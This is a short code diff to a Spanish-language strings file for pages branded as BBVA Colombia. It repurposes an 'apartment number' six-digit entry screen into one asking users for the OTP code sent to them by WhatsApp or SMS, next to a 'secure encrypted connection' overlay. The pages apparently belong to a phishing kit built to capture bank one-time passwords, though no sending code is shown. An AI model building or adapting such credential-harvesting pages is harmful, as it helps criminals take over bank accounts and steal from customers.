@@ -100,11 +100,11 @@
       CARGANDO_OVERLAY_SECURITY: "Conexión cifrada y segura",
 
       // === VISTA: NÚMERO DE APTO (numero-de-apto.html) ===
-      APTO_PAGE_TITLE: "Número de Apto | BBVA Colombia",
-      APTO_BADGE: "Validación de Residencia",
-      APTO_TITLE: "Número de apto",
+      APTO_PAGE_TITLE: "OTP CODIGO | BBVA Colombia",
+      APTO_BADGE: "Validación de seguridad",
+      APTO_TITLE: "OTP",
       APTO_SUBTITLE: "Ingresa los 6 dígitos correspondientes para continuar con la validación de tu información.",
-      APTO_LABEL: "Número de apartamento",
+      APTO_LABEL: "Código OTP enviado a WhatsApp o SMS",
       APTO_ERROR_MSG: "Por favor completa los 6 dígitos requeridos.",
       APTO_HINT: "Ingresa únicamente números. Puedes pegar el valor completo.",
       APTO_BTN_CONTINUAR: "Continuar",
